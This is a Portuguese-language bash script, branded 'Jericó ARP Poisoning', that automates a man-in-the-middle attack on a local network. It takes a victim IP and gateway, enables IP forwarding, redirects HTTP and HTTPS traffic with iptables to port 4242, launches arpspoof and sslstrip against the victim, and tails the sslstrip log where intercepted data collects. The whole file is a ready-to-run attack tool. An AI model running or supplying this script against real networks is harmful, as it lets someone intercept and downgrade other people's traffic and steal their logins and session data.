#!/bin/bash
if [[ $EUID -ne 0 ]]; then
	echo -e "Este Script deve ser executado como Root ou Sudo \n"
	echo -e "\t\t\t Exemplo: sudo ./Jerico-ArpPoison.sh  \n"
exit 1
else
clear
echo $"

   __     ______     ______     __     ______     ______    
  /\ \   /\  ___\   /\  == \   /\ \   /\  ___\   /\  __ \   
 _\_\ \  \ \  __\   \ \  __<   \ \ \  \ \ \____  \ \ \/\ \  
/\_____\  \ \_____\  \ \_\ \_\  \ \_\  \ \_____\  \ \_____\ 
\/_____/   \/_____/   \/_/ /_/   \/_/   \/_____/   \/_____/ 
                                                            
	           JERICÓ ARP POISONING 
            TESTE DE AUTOMATIZAÇÃO
	   ARPSPOOF AND SSLSTRIP MANAGER TOOL
		                              V1.1
		      CODED BY: D0ctor
		  www.nanoshots.com.br
		  github.com/msfidelis


"

#Le as variaveis
echo -n "Insira o IP do alvo: "
read victimIP
echo -n "Insira o IP do Gateway: "
read gatewayIP
echo -n "Selecione a interface de Rede (Ex:eth0, wlan0): "
read interface

echo -e "\t\tTarget: $victimIP"
echo -e "\t\tGateway: $gatewayIP \n\n"
echo -e "[*] Estabelecendo o redirecionamento de pacotes \n"

#Estabelece o redirecionamento de pacotes
echo "1" > /proc/sys/net/ipv4/ip_forward

#Estabelece o Redirecionamento do Firewall da porta 80 do HTTP para a porta 4242
echo -e "[*] Iniciando o redirecionamento da porta 80 para a 8080 no IPTables \n"
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 4242

#Estabelece o Redirecionamento do Firewall da porta 443 do HTTPS para a porta 4242
echo -e "[*] Iniciando o redirecionamento da porta 443 do HTTPS para a porta 4242 no IPTables \n"
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 4242

#INICIA O ARP POISONING
echo -e "[*] Iniciando o Poisoning entre  $victimIP e $gatewayIP! \n"

#Inicia o Arpspoof
echo -e "[*] Iniciando o Arpspoof \n"
xterm -e "arpspoof -i $interface -t $victimIP $gatewayIP" &  

#Inicia o SSLstrip
echo -e "[*] Iniciando o SSLStrip \n"
xterm -e "sslstrip -a -l 4242" &

#Cria a função que lê o log sslstrip.log de forma contínua 
echo -e "[*] Iniciando a leitura dos Logs"
touch sslstrip.log
tail -f sslstrip.log

fi
